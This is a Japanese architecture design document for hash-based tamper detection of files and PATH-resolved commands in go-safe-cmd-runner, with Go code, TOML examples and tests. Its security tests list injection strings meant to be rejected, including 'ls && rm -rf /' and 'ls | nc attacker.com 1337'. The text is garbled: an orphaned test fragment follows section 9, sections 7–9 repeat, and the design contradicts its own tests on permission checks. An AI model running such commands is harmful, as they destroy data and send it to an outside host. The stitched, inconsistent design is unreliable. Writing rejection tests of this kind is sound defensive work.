# アーキテクチャ設計書: ファイル改ざん検出機能の実装

## 1. 概要

本設計書では、go-safe-cmd-runnerにおけるファイル改ざん検出機能の包括的実装アーキテクチャについて説明する。

### 1.1 設計原則

- **段階的検証**: global → groups の順序で検証を実行
- **柔軟なエラーハンドリング**: global失敗は終了、groups失敗はスキップ
- **既存アーキテクチャ継承**: 設定ファイル検証機能の設計を踏襲
- **セキュリティファースト**: filevalidatorとsecurityパッケージの活用
- **コマンドパス解決**: PATH環境変数による動的パス解決

## 2. システム全体アーキテクチャ

### 2.1 コンポーネント図

```
┌─────────────────────────────────────────┐
│              go-safe-cmd-runner         │
├─────────────────────────────────────────┤
│  main.go                                │
│  ├─ 1. Config File Hash Verification   │
│  ├─ 2. Config Loading                   │
│  ├─ 3. Global Hash Verification        │  ← 新規
│  ├─ 4. Groups Processing               │
│  │  └─ Groups Hash Verification        │  ← 新規
│  └─ 5. Command Execution               │
└─────────────────────────────────────────┘
                    │
                    ▼
┌─────────────────────────────────────────┐
│        Extended Hash Verification      │  ← 拡張
├─────────────────────────────────────────┤
│  verification.Manager                   │
│  ├─ VerifyConfigFile()                  │  ← 既存
│  ├─ VerifyGlobalFiles()                 │  ← 新規
│  ├─ VerifyGroupFiles()                  │  ← 新規
│  ├─ ResolveCommandPath()               │  ← 新規
│  └─ ValidateHashDirectory()             │
└─────────────────────────────────────────┘
                    │
                    ▼
┌─────────────────────────────────────────┐
│           既存コンポーネント              │
├─────────────────────────────────────────┤
│  filevalidator.Validator                │
│  ├─ Verify(filePath)                    │
│  └─ Record(filePath)                    │
│                                         │
│  security.Validator                     │
│  ├─ ValidateFilePermissions(filePath)   │
│  └─ ValidateDirectoryPermissions(path)  │
│                                         │
│  runner.ConfigLoader                    │  ← 拡張
│  ├─ LoadConfig()                        │
│  ├─ GetGlobalHashFiles()               │  ← 新規
│  └─ GetGroupHashFiles()                │  ← 新規
└─────────────────────────────────────────┘
```

### 2.2 データフロー

```
[起動] → [設定ファイル検証] → [設定読み込み] → [global検証] → [groups処理]
   │           │                   │               │              │
   │           │                   │               │              ├─ グループ1: 一括バッチ検証
   │           │                   │               │              │  ├─ ファイル収集（明示的+コマンド）
   │           │                   │               │              │  ├─ 重複排除・スキップ判定
   │           │                   │               │              │  ├─ 一括ハッシュ検証
   │           │                   │               │              │  ├─ 成功: 全コマンド実行
   │           │                   │               │              │  └─ 失敗: グループスキップ
   │           │                   │               │              │
   │           │                   │               │              ├─ グループ2: 一括バッチ検証
   │           │                   │               │              │  └─ ...
   │           │                   │               │              │
   │           │                   │               ├─ 成功: 続行
   │           │                   │               └─ 失敗: 終了
   │           │                   │
   │           ├─ 成功: 続行
   │           └─ 失敗: 終了
   │
   └─ 無効時: 検証スキップ
```

## 3. 詳細設計

### 3.1 設定ファイル拡張

#### 3.1.1 global セクション拡張

```toml
# config.toml
[global]
timeout = 3600
workdir = "/tmp"
log_level = "info"

# 新規追加: global 検証対象ファイル
verify_files = [
    "/usr/bin/systemctl",
    "/usr/bin/ls",
    "/etc/ssl/certs/ca-certificates.crt"
]
```

#### 3.1.2 groups セクション拡張

```toml
[[groups]]
name = "system-maintenance"

# 新規追加: groups 検証対象ファイル
verify_files = [
    "/usr/sbin/logrotate",
    "/etc/logrotate.conf"
]

# 既存コマンド（自動的に検証対象に追加される）
[[groups.commands]]
cmd = "systemctl"  # PATH解決 → /usr/bin/systemctl → 検証対象
args = ["status", "nginx"]

[[groups.commands]]
cmd = "/usr/sbin/nginx"  # 絶対パス → 直接検証対象
args = ["-t"]
```

### 3.2 新規コンポーネント設計

#### 3.2.1 VerifyFiles 構造体

```go
// internal/runner/runnertypes/types.go 拡張
type GlobalConfig struct {
    // 既存フィールド
    Timeout     int         `toml:"timeout"`
    Workdir     string      `toml:"workdir"`
    LogLevel    string      `toml:"log_level"`
    Environment map[string]string `toml:"environment"`

    // 新規追加
    VerifyFiles       []string `toml:"verify_files"`
    SkipStandardPaths bool     `toml:"skip_standard_paths"`
}

type GroupConfig struct {
    // 既存フィールド
    Name        string      `toml:"name"`
    Description string      `toml:"description"`
    Commands    []Command   `toml:"commands"`
    Environment map[string]string `toml:"environment"`

    // 新規追加
    VerifyFiles []string `toml:"verify_files"`
}
```

#### 3.2.2 拡張 verification.Manager

```go
// internal/verification/manager.go 拡張
type Manager struct {
    config    Config
    fs        common.FileSystem
    validator *filevalidator.Validator
    security  *security.Validator
}

// 新規メソッド
func (vm *Manager) VerifyGlobalFiles(globalConfig *runnertypes.GlobalConfig) (*VerificationResult, error)
func (vm *Manager) VerifyGroupFiles(groupConfig *runnertypes.GroupConfig) (*VerificationResult, error)
func (vm *Manager) ResolveCommandPath(command string) (string, error)

// 内部メソッド（一括処理用）
func (vm *Manager) collectAllVerificationFiles(groupConfig *runnertypes.GroupConfig) ([]string, error)
func (vm *Manager) resolveAndCollectCommandPaths(commands []runnertypes.Command) ([]string, error)
func (vm *Manager) verifyFileBatch(files []string) (*VerificationResult, error)
func (vm *Manager) removeDuplicatePaths(paths []string) []string
func (vm *Manager) shouldSkipVerification(path string) bool
```

#### 3.2.3 コマンドパス解決とスキップ機能

```go
// internal/verification/path_resolver.go 新規
type PathResolver struct {
    pathEnv           string
    security          *security.Validator
    skipStandardPaths bool
    standardPaths     []string
}

func NewPathResolver(pathEnv string, security *security.Validator, skipStandardPaths bool) *PathResolver {
    return &PathResolver{
        pathEnv:           pathEnv,
        security:          security,
        skipStandardPaths: skipStandardPaths,
        standardPaths:     []string{"/bin/", "/sbin/", "/usr/bin/", "/usr/sbin/"},
    }
}

func (pr *PathResolver) ResolvePath(command string) (string, error) {
    // 1. パストラバーサル攻撃の検証
    if err := pr.validateCommandSafety(command); err != nil {
        return "", fmt.Errorf("unsafe command rejected: %w", err)
    }

    // 2. 絶対パスの場合はそのまま返す
    if filepath.IsAbs(command) {
        return command, nil
    }

    // 3. PATH環境変数から解決
    for _, dir := range strings.Split(pr.pathEnv, ":") {
        // 4. ディレクトリの存在と読み取り権限の確認（厳格なパーミッションチェックなし）
        if !pr.canAccessDirectory(dir) {
            slog.Debug("Skipping inaccessible directory", "directory", dir)
            continue // アクセスできないディレクトリはスキップ
        }

        // 5. コマンドファイルの存在確認
        fullPath := filepath.Join(dir, command)

        // 6. 解決されたパスが想定ディレクトリ内にあることを確認
        if !pr.isPathWithinDirectory(fullPath, dir) {
            slog.Warn("Path traversal attempt detected",
                "command", command,
                "directory", dir,
                "resolved_path", fullPath)
            continue // パストラバーサル試行をスキップ
        }

        if info, err := os.Stat(fullPath); err == nil && !info.IsDir() {
            // 実行ファイルの存在確認のみ（パーミッションチェックなし）
            return fullPath, nil
        }
    }

    return "", fmt.Errorf("command not found in PATH: %s", command)
}

// ディレクトリへのアクセス可能性だけを確認（厳格なパーミッションチェックなし）
func (pr *PathResolver) canAccessDirectory(dir string) bool {
    info, err := os.Stat(dir)
    if err != nil {
        return false // ディレクトリが存在しないか、アクセスできない
    }

    return info.IsDir() // ディレクトリであることだけを確認
}
```

#### 3.2.4 一括バッチ検証の詳細設計

```go
// VerifyGroupFiles の一括バッチ処理実装
func (vm *Manager) VerifyGroupFiles(groupConfig *runnertypes.GroupConfig) (*VerificationResult, error) {
    if !vm.IsEnabled() {
        return &VerificationResult{}, nil
    }

    // 1. 全ファイルの収集（明示的ファイル + コマンドファイル）
    allFiles, err := vm.collectAllVerificationFiles(groupConfig)
    if err != nil {
        return nil, fmt.Errorf("failed to collect verification files: %w", err)
    }

    // 2. 重複排除
    uniqueFiles := vm.removeDuplicatePaths(allFiles)

    // 3. スキップ対象ファイルの分離
    var filesToVerify []string
    var skippedFiles []string

    for _, file := range uniqueFiles {
        if vm.shouldSkipVerification(file) {
            skippedFiles = append(skippedFiles, file)
            slog.Debug("Skipping verification for standard system path",
                "group", groupConfig.Name, "file", file)
        } else {
            filesToVerify = append(filesToVerify, file)
        }
    }

    // 4. 一括ハッシュ検証実行
    result, err := vm.verifyFileBatch(filesToVerify)
    if err != nil {
        // 部分的な結果も含めて返す
        result.SkippedFiles = skippedFiles
        result.TotalFiles = len(uniqueFiles)
        return result, &VerificationError{
            Op: "group",
            Group: groupConfig.Name,
            Details: result.FailedFiles,
            Err: ErrGroupVerificationFailed,
        }
    }

    // 5. 最終結果の構築
    result.SkippedFiles = skippedFiles
    result.TotalFiles = len(uniqueFiles)

    slog.Info("Group file verification completed",
        "group", groupConfig.Name,
        "total_files", result.TotalFiles,
        "verified_files", result.VerifiedFiles,
        "skipped_files", len(result.SkippedFiles))

    return result, nil
}

// ファイル収集メソッド
func (vm *Manager) collectAllVerificationFiles(groupConfig *runnertypes.GroupConfig) ([]string, error) {
    var allFiles []string

    // 明示的検証ファイル
    for _, filePath := range groupConfig.VerifyFiles {
        allFiles = append(allFiles, filePath)
    }

    // コマンドファイルの解決と収集
    commandFiles, err := vm.resolveAndCollectCommandPaths(groupConfig.Commands)
    if err != nil {
        return nil, err
    }
    allFiles = append(allFiles, commandFiles...)

    return allFiles, nil
}

// コマンドパス解決
func (vm *Manager) resolveAndCollectCommandPaths(commands []runnertypes.Command) ([]string, error) {
    var resolvedPaths []string

    for _, command := range commands {
        resolvedPath, err := vm.pathResolver.Resolve(command.Cmd)
        if err != nil {
            slog.Warn("Failed to resolve command path, excluding from verification",
                "command", command.Cmd,
                "error", err.Error())
            continue // エラーのコマンドは除外して続行
        }
        resolvedPaths = append(resolvedPaths, resolvedPath)
    }

    return resolvedPaths, nil
}

// 一括ファイル検証
func (vm *Manager) verifyFileBatch(files []string) (*VerificationResult, error) {
    result := &VerificationResult{
        TotalFiles: len(files),
    }

    start := time.Now()
    defer func() {
        result.Duration = time.Since(start)
    }()

    for _, file := range files {
        if err := vm.validator.Verify(file); err != nil {
            result.FailedFiles = append(result.FailedFiles, file)
            slog.Debug("File verification failed", "file", file, "error", err.Error())
        } else {
            result.VerifiedFiles++
            slog.Debug("File verification succeeded", "file", file)
        }
    }

    if len(result.FailedFiles) > 0 {
        return result, fmt.Errorf("batch verification failed: %d/%d files failed",
            len(result.FailedFiles), len(files))
    }

    return result, nil
}
```

### 3.3 処理フロー設計

#### 3.3.1 main.go の変更

```go
func main() {
    // 1. 既存の設定ファイル検証
    if err := verificationManager.VerifyConfigFile(*configPath); err != nil {
        return fmt.Errorf("config verification failed: %w", err)
    }

    // 2. 設定ファイル読み込み
    cfg, err := cfgLoader.LoadConfig(*configPath)
    if err != nil {
        return fmt.Errorf("failed to load config: %w", err)
    }

    // 3. 新規: global ファイル検証
    if err := verificationManager.VerifyGlobalFiles(&cfg.Global); err != nil {
        return fmt.Errorf("global files verification failed: %w", err)
    }

    // 4. Runner初期化と実行
    runner, err := runner.NewRunnerWithComponents(cfg, cfgLoader.GetTemplateEngine(), verificationManager)
    if err != nil {
        return fmt.Errorf("failed to initialize runner: %w", err)
    }

    return runner.Run()
}
```

#### 3.3.2 Runner.executeGroup の変更

```go
func (r *Runner) executeGroup(group *runnertypes.GroupConfig) error {
    // 1. 新規: グループ全体のファイル検証（一括バッチ処理）
    if r.verificationManager != nil {
        result, err := r.verificationManager.VerifyGroupFiles(group)
        if err != nil {
            slog.Warn("Group file verification failed, skipping group",
                "group", group.Name,
                "total_files", result.TotalFiles,
                "verified_files", result.VerifiedFiles,
                "failed_files", result.FailedFiles,
                "skipped_files", result.SkippedFiles,
                "error", err.Error())
            return nil // エラーを返さずスキップ
        }

        slog.Info("Group file verification completed",
            "group", group.Name,
            "verified_files", result.VerifiedFiles,
            "skipped_files", len(result.SkippedFiles),
            "duration_ms", result.Duration.Milliseconds())
    }

    // 2. コマンド実行ループ（検証は完了済み）
    for _, command := range group.Commands {
        // 3. 既存: コマンド実行（検証なし、既に完了）
        if err := r.executeCommand(&command); err != nil {
            return err
        }
    }

    return nil
}
```

### 3.4 ディレクトリ構造

```
internal/
├── verification/           # 拡張
│   ├── manager.go         # Manager拡張
│   ├── manager_test.go    # テスト拡張
│   ├── path_resolver.go   # 新規: パス解決
│   ├── path_resolver_test.go # 新規: テスト
│   ├── config.go          # 既存
│   └── errors.go          # 既存
├── runner/
│   ├── runner.go          # executeGroup変更
│   ├── runner_test.go     # テスト拡張
│   └── runnertypes/
│       └── types.go       # 設定構造体拡張
└── filevalidator/         # 既存（活用）
    └── validator.go
```

## 4. セキュリティ設計

### 4.1 ファイル権限チェックの区別

- **設定ファイル**: 厳格なパーミッションチェック（root所有、他ユーザー書き込み不可）
- **実行ファイル・参照ファイル**: パーミッションチェックなし（ハッシュ値比較のみ）
  - 第三者（自動実行用アカウント等）による書き込みを許可
  - 改ざんはハッシュ値で確実に検出可能
  - ファイルの存在確認のみ行い、パーミッションや所有権は検証しない

### 4.2 検証段階とエラーハンドリング

```
起動時検証:
├─ 1. 設定ファイル検証
│  └─ 失敗時: プロセス終了
├─ 2. global ファイル検証
│  └─ 失敗時: プロセス終了
└─ 3. groups 処理
   ├─ グループA: ファイル検証
   │  ├─ 成功: コマンド実行
   │  └─ 失敗: グループスキップ
   ├─ グループB: ファイル検証
   │  └─ ...
   └─ コマンド個別検証
      ├─ 成功: コマンド実行
      └─ 失敗: コマンドスキップ
```

### 4.2.1 パストラバーサル攻撃対策

**多層防御アプローチ:**

1. **事前検証**: コマンド文字列の安全性チェック
   - `..` 文字列の検出と拒否
   - NULLバイト攻撃の検出
   - 制御文字の検出
   - 相対パスでの `/` 文字の検出

2. **事後検証**: 解決されたパスの妥当性確認
   - `filepath.Rel()` を使用したディレクトリ外アクセスの検出
   - 絶対パス正規化による迂回攻撃の防止

3. **ディレクトリアクセス確認**: PATH内の各ディレクトリへのアクセス可能性確認（厳格な権限チェックなし）

```go
// セキュアなPATH解決
func (pr *PathResolver) securePathResolution(command string) (string, error) {
    pathDirs := strings.Split(os.Getenv("PATH"), ":")

    for _, dir := range pathDirs {
        // 1. ディレクトリアクセス確認（厳格な権限チェックなし）
        if !pr.canAccessDirectory(dir) {
            slog.Debug("Skipping inaccessible directory", "directory", dir)
            continue
        }

        // 2. コマンドファイル確認
        fullPath := filepath.Join(dir, command)

        // 3. パストラバーサル検証
        if !isPathWithinDirectory(fullPath, dir) {
            slog.Warn("Path traversal attempt detected",
                "command", command,
                "directory", dir,
                "resolved_path", fullPath)
            continue
        }

        if info, err := os.Stat(fullPath); err == nil && !info.IsDir() {
            // ファイルの存在確認のみ（パーミッションチェックなし）
            return fullPath, nil
        }
    }

    return "", fmt.Errorf("command not found in PATH directories: %s", command)
}
```

## 5. パフォーマンス設計

### 5.1 最適化戦略

- **一括バッチ処理**: グループ内の全ファイルを一度に収集・検証することで効率化
- **重複排除**: 同一ファイルの重複検証を自動的に排除
- **早期スキップ判定**: 標準パスファイルの事前分離でI/O削減
- **遅延評価**: groups検証は各グループ実行直前に実行
- **並列処理**: 複数ファイルの検証を並列実行（将来拡張）

### 5.2 パフォーマンス目標

| 項目 | 目標値 | 備考 |
|------|--------|------|
| global検証時間 | < 100ms | 10ファイル想定 |
| group検証時間 | < 50ms/group | 5ファイル/group想定 |
| PATH解決時間 | < 10ms/command | キャッシュ使用 |
| メモリ使用量増加 | < 5MB | ハッシュキャッシュ含む |

## 6. テスト設計

### 6.1 テスト戦略

```
verification/
├── manager_test.go
│   ├─ TestManager_VerifyGlobalFiles
│   ├─ TestManager_VerifyGroupFiles
│   ├─ TestManager_VerifyCommandFile
│   └─ TestManager_Integration
├── path_resolver_test.go
│   ├─ TestPathResolver_ResolveSecurePath
│   ├─ TestPathResolver_InsecurePATH
│   └─ TestPathResolver_CommandNotFound
└── integration_test.go
    ├─ TestEndToEnd_GlobalVerification
    ├─ TestEndToEnd_GroupVerification
    └─ TestEndToEnd_CommandVerification
```

### 6.2 モックテスト

```go
func TestManager_VerifyGlobalFiles(t *testing.T) {
    mockFS := common.NewMockFileSystem()

    // テストファイル作成
    mockFS.AddFile("/usr/bin/ls", 0755, []byte("ls binary"))
    mockFS.AddFile("/usr/bin/systemctl", 0755, []byte("systemctl binary"))

    // ハッシュファイル作成
    mockFS.AddFile("/hashes/usr/bin/ls.sha256", 0644, []byte("expected_hash"))
    mockFS.AddFile("/hashes/usr/bin/systemctl.sha256", 0644, []byte("expected_hash"))

    // 設定作成
    globalConfig := &runnertypes.GlobalConfig{
        VerifyFiles: []string{
            "/usr/bin/ls",
            "/usr/bin/systemctl",
        },
    }

    // テスト実行
    vm := NewManagerWithFS(config, mockFS)
    result, err := vm.VerifyGlobalFiles(globalConfig)
    assert.NoError(t, err)
    assert.Equal(t, 2, result.VerifiedFiles)
    assert.Empty(t, result.FailedFiles)
}

func TestManager_VerifyGroupFiles_BatchProcessing(t *testing.T) {
    mockFS := common.NewMockFileSystem()

    // 明示的ファイル + コマンドファイル（重複あり）
    mockFS.AddFile("/usr/bin/ls", 0755, []byte("ls binary"))
    mockFS.AddFile("/usr/sbin/nginx", 0755, []byte("nginx binary"))
    mockFS.AddFile("/etc/nginx.conf", 0644, []byte("nginx config"))

    // ハッシュファイル作成
    mockFS.AddFile("/hashes/usr/bin/ls.sha256", 0644, []byte("ls_hash"))
    mockFS.AddFile("/hashes/usr/sbin/nginx.sha256", 0644, []byte("nginx_hash"))
    mockFS.AddFile("/hashes/etc/nginx.conf.sha256", 0644, []byte("config_hash"))

    groupConfig := &runnertypes.GroupConfig{
        Name: "web-server",
        VerifyFiles: []string{
            "/etc/nginx.conf",  // 明示的ファイル
            "/usr/bin/ls",      // コマンドと重複
        },
        Commands: []runnertypes.Command{
            {Cmd: "ls", Args: []string{"-la"}},           // 相対パス → /usr/bin/ls
            {Cmd: "/usr/sbin/nginx", Args: []string{"-t"}}, // 絶対パス
        },
    }

    // テスト実行（重複排除とバッチ処理を確認）
    vm := NewManagerWithFS(config, mockFS)
    result, err := vm.VerifyGroupFiles(groupConfig)

    assert.NoError(t, err)
    assert.Equal(t, 3, result.TotalFiles)      // 重複排除後の合計
    assert.Equal(t, 3, result.VerifiedFiles)  // 全て検証成功
    assert.Empty(t, result.FailedFiles)       // 失敗なし
}
```

### 6.3 セキュリティテスト

```go
// 包括的なパストラバーサル攻撃テスト
func TestPathResolver_PathTraversalSecurity(t *testing.T) {
    mockFS := common.NewMockFileSystem()

    // 安全なディレクトリ構造作成
    mockFS.AddDir("/usr/bin", 0755)
    mockFS.AddFile("/usr/bin/ls", 0755, []byte("safe ls"))
    mockFS.AddDir("/etc", 0755)
    mockFS.AddFile("/etc/passwd", 0644, []byte("sensitive data"))

    security, _ := security.NewValidatorWithFS(security.DefaultConfig(), mockFS)
    pathResolver := NewPathResolver("/usr/bin", security, false)

    // 攻撃シナリオ1: PATHインジェクション
    maliciousPATH := "/tmp:/usr/bin"
    pathResolver = NewPathResolver(maliciousPATH, security, false)

    // 不安全な/tmpディレクトリは権限チェックで排除される
    _, err := pathResolver.ResolvePath("malicious")
    assert.Error(t, err, "Should reject commands from insecure directories")

    // 攻撃シナリオ2: コマンドインジェクション試行
    attackCommands := []string{
        "ls; cat /etc/passwd",
        "ls && rm -rf /",
        "ls | nc attacker.com 1337",
        "$(cat /etc/passwd)",
        "`cat /etc/passwd`",
    }

    for _, cmd := range attackCommands {
        _, err := pathResolver.ResolvePath(cmd)
        assert.Error(t, err, "Should reject command injection attempt: %s", cmd)
    }
}
```

## 7. 実装フェーズ

### Phase 1: 基盤機能
- [ ] 設定ファイル拡張（global/groups の hash_files セクション）
- [ ] runnertypes.Config 構造体拡張（SkipStandardPaths フィールド追加）
- [ ] verification.Manager の VerifyGlobalFiles/VerifyGroupFiles メソッド

### Phase 2: 検証機能
- [ ] main.go への global 検証統合
- [ ] runner.executeGroup への groups 検証統合
- [ ] エラーハンドリング（global失敗→終了、groups失敗→スキップ）

### Phase 3: 統合・テスト
- [ ] PathResolver 実装（スキップ機能付き）
- [ ] コマンド個別検証機能（標準パススキップ対応）
- [ ] 設定ファイル・コマンドライン引数でのスキップ機能制御
- [ ] 包括的テストスイート
- [ ] パフォーマンステスト

## 8. 運用考慮事項

### 8.1 デプロイメント手順

```bash
# 1. ハッシュ記録（global ファイル）
sudo ./build/record -file /usr/bin/systemctl -hash-dir /usr/local/etc/go-safe-cmd-runner/hashes
sudo ./build/record -file /usr/bin/ls -hash-dir /usr/local/etc/go-safe-cmd-runner/hashes

# 2. ハッシュ記録（groups ファイル）
sudo ./build/record -file /usr/sbin/logrotate -hash-dir /usr/local/etc/go-safe-cmd-runner/hashes
sudo ./build/record -file /etc/logrotate.conf -hash-dir /usr/local/etc/go-safe-cmd-runner/hashes

# 3. 設定ファイル更新
vi /etc/go-safe-cmd-runner/config.toml  # hash_files セクション追加

# 4. 動作確認
./runner --config /etc/go-safe-cmd-runner/config.toml
```

### 8.2 監視とロギング

```go
// 構造化ログ例
slog.Info("Global files verification completed",
    "verified_files", len(globalConfig.HashFiles),
    "verification_duration_ms", duration.Milliseconds())

slog.Warn("Group file verification failed, skipping group",
    "group", group.Name,
    "failed_file", failedFile,
    "error", err.Error())

slog.Error("Command verification failed",
    "command", command.Cmd,
    "resolved_path", resolvedPath,
    "error", err.Error())
```

## 9. 将来拡張

### 9.1 高度な機能

- **ハッシュキャッシュ**: 同一ファイルの重複検証回避
- **並列検証**: 複数ファイルの同時検証
- **動的ライブラリ検証**: 実行時ロードされるライブラリの検証
- **設定テンプレート**: 共通ファイルセットのテンプレート化

### 9.2 設定拡張例

```toml
[global]
# 既存設定...

# 将来の拡張
hash_cache_ttl = "1h"
parallel_verification = true

[[global.hash_templates]]
name = "system_binaries"
paths = ["/usr/bin/*", "/usr/sbin/*"]
include_pattern = "^(systemctl|ls|cat|grep)$"
```
        {
            name:    "null_byte_injection",
            command: "ls\x00../../../etc/passwd",
            reason:  "contains null bytes",
        },
        {
            name:    "control_character_injection",
            command: "ls\x01malicious",
            reason:  "contains control characters",
        },
        {
            name:    "directory_escape_slash",
            command: "../etc/passwd",
            reason:  "directory escape attempt",
        },
        {
            name:    "long_command_name",
            command: strings.Repeat("a", 300),
            reason:  "command name too long",
        },
    }

    for _, tc := range maliciousCommands {
        t.Run(tc.name, func(t *testing.T) {
            _, err := pathResolver.ResolvePath(tc.command)
            assert.Error(t, err, "Should reject malicious command: %s (%s)", tc.command, tc.reason)
            assert.Contains(t, err.Error(), "unsafe command rejected",
                "Error should indicate security rejection")
        })
    }
}

func TestPathResolver_ValidateCommandSafety(t *testing.T) {
    pathResolver := &PathResolver{}

    testCases := []struct {
        name        string
        command     string
        shouldError bool
        errorText   string
    }{
        {
            name:        "safe_command",
            command:     "ls",
            shouldError: false,
        },
        {
            name:        "safe_absolute_path",
            command:     "/usr/bin/ls",
            shouldError: false,
        },
        {
            name:        "path_traversal_dots",
            command:     "../../../etc/passwd",
            shouldError: true,
            errorText:   "path traversal sequences",
        },
        {
            name:        "relative_with_slash",
            command:     "subdir/command",
            shouldError: true,
            errorText:   "path separators",
        },
        {
            name:        "null_byte_attack",
            command:     "ls\x00",
            shouldError: true,
            errorText:   "null bytes",
        },
        {
            name:        "control_characters",
            command:     "ls\x01",
            shouldError: true,
            errorText:   "control characters",
        },
        {
            name:        "too_long_command",
            command:     strings.Repeat("x", 256),
            shouldError: true,
            errorText:   "too long",
        },
    }

    for _, tc := range testCases {
        t.Run(tc.name, func(t *testing.T) {
            err := pathResolver.validateCommandSafety(tc.command)

            if tc.shouldError {
                assert.Error(t, err)
                assert.Contains(t, err.Error(), tc.errorText)
            } else {
                assert.NoError(t, err)
            }
        })
    }
}

func TestPathResolver_IsPathWithinDirectory(t *testing.T) {
    pathResolver := &PathResolver{}

    testCases := []struct {
        name         string
        resolvedPath string
        baseDir      string
        expected     bool
    }{
        {
            name:         "safe_path_within_directory",
            resolvedPath: "/usr/bin/ls",
            baseDir:      "/usr/bin",
            expected:     true,
        },
        {
            name:         "path_traversal_escape",
            resolvedPath: "/etc/passwd",
            baseDir:      "/usr/bin",
            expected:     false,
        },
        {
            name:         "relative_escape_attempt",
            resolvedPath: "/usr/bin/../../../etc/passwd",
            baseDir:      "/usr/bin",
            expected:     false,
        },
        {
            name:         "subdirectory_access",
            resolvedPath: "/usr/bin/subdir/tool",
            baseDir:      "/usr/bin",
            expected:     true,
        },
    }

    for _, tc := range testCases {
        t.Run(tc.name, func(t *testing.T) {
            result := pathResolver.isPathWithinDirectory(tc.resolvedPath, tc.baseDir)
            assert.Equal(t, tc.expected, result)
        })
    }
}

func TestSecurity_RealWorldAttackScenarios(t *testing.T) {
    mockFS := common.NewMockFileSystem()

    // 実際の攻撃シナリオをシミュレート
    mockFS.AddDir("/usr/bin", 0755)
    mockFS.AddDir("/tmp", 0777) // 攻撃者が書き込み可能
    mockFS.AddFile("/tmp/malicious", 0755, []byte("malicious binary"))
    mockFS.AddFile("/etc/passwd", 0644, []byte("root:x:0:0:root:/root:/bin/bash"))

    security, _ := security.NewValidatorWithFS(security.DefaultConfig(), mockFS)

    // 攻撃シナリオ1: PATHインジェクション
    maliciousPATH := "/tmp:/usr/bin"
    pathResolver := NewPathResolver(maliciousPATH, security, false)

    // 不安全な/tmpディレクトリは権限チェックで排除される
    _, err := pathResolver.ResolvePath("malicious")
    assert.Error(t, err, "Should reject commands from insecure directories")

    // 攻撃シナリオ2: コマンドインジェクション試行
    attackCommands := []string{
        "ls; cat /etc/passwd",
        "ls && rm -rf /",
        "ls | nc attacker.com 1337",
        "$(cat /etc/passwd)",
        "`cat /etc/passwd`",
    }

    for _, cmd := range attackCommands {
        _, err := pathResolver.ResolvePath(cmd)
        assert.Error(t, err, "Should reject command injection attempt: %s", cmd)
    }
}
```

## 7. 実装フェーズ

### Phase 1: 基盤機能
- [ ] 設定ファイル拡張（global/groups の hash_files セクション）
- [ ] runnertypes.Config 構造体拡張（SkipStandardPaths フィールド追加）
- [ ] verification.Manager の VerifyGlobalFiles/VerifyGroupFiles メソッド

### Phase 2: 検証機能
- [ ] main.go への global 検証統合
- [ ] runner.executeGroup への groups 検証統合
- [ ] エラーハンドリング（global失敗→終了、groups失敗→スキップ）

### Phase 3: 統合・テスト
- [ ] PathResolver 実装（スキップ機能付き）
- [ ] コマンド個別検証機能（標準パススキップ対応）
- [ ] 設定ファイル・コマンドライン引数でのスキップ機能制御
- [ ] 包括的テストスイート
- [ ] パフォーマンステスト

## 8. 運用考慮事項

### 8.1 デプロイメント手順

```bash
# 1. ハッシュ記録（global ファイル）
sudo ./build/record -file /usr/bin/systemctl -hash-dir /usr/local/etc/go-safe-cmd-runner/hashes
sudo ./build/record -file /usr/bin/ls -hash-dir /usr/local/etc/go-safe-cmd-runner/hashes

# 2. ハッシュ記録（groups ファイル）
sudo ./build/record -file /usr/sbin/logrotate -hash-dir /usr/local/etc/go-safe-cmd-runner/hashes
sudo ./build/record -file /etc/logrotate.conf -hash-dir /usr/local/etc/go-safe-cmd-runner/hashes

# 3. 設定ファイル更新
vi /etc/go-safe-cmd-runner/config.toml  # hash_files セクション追加

# 4. 動作確認
./runner --config /etc/go-safe-cmd-runner/config.toml
```

### 8.2 監視とロギング

```go
// 構造化ログ例
slog.Info("Global files verification completed",
    "verified_files", len(globalConfig.HashFiles),
    "verification_duration_ms", duration.Milliseconds())

slog.Warn("Group file verification failed, skipping group",
    "group", group.Name,
    "failed_file", failedFile,
    "error", err.Error())

slog.Error("Command verification failed",
    "command", command.Cmd,
    "resolved_path", resolvedPath,
    "error", err.Error())
```

## 9. 将来拡張

### 9.1 高度な機能

- **ハッシュキャッシュ**: 同一ファイルの重複検証回避
- **並列検証**: 複数ファイルの同時検証
- **動的ライブラリ検証**: 実行時ロードされるライブラリの検証
- **設定テンプレート**: 共通ファイルセットのテンプレート化

### 9.2 設定拡張例

```toml
[global]
# 既存設定...

# 将来の拡張
hash_cache_ttl = "1h"
parallel_verification = true

[[global.hash_templates]]
name = "system_binaries"
paths = ["/usr/bin/*", "/usr/sbin/*"]
include_pattern = "^(systemctl|ls|cat|grep)$"
```
